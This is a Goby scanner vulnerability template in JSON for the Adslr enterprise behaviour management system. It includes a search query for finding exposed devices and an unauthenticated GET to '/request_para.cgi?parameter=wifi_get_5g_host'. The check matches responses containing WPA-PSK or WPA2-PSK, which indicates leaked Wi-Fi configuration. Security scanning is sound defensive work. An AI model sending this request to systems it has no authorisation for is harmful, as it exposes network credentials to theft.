{
      "Name": "Adslr Enterprise online behavior management system Information leakage",
      "Level": "0",
      "Tags": [],
      "GobyQuery": "title=\"飞鱼星企业级智能上网行为管理系统\"",
      "Description": "",
      "Product": "",
      "Homepage": "https://gobies.org/",
      "Author": "gobysec@gmail.com",
      "Impact": "",
      "Recommandation": "",
      "References": [
            "https://gobies.org/"
      ],
      "ScanSteps": [
            "OR",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/request_para.cgi?parameter=wifi_get_5g_host",
                        "follow_redirect": false,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "WPA-PSK",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/request_para.cgi?parameter=wifi_get_5g_host",
                        "follow_redirect": false,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "WPA2-PSK",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "PostTime": "2021-04-19 23:31:00",
      "GobyVersion": "1.8.258"
}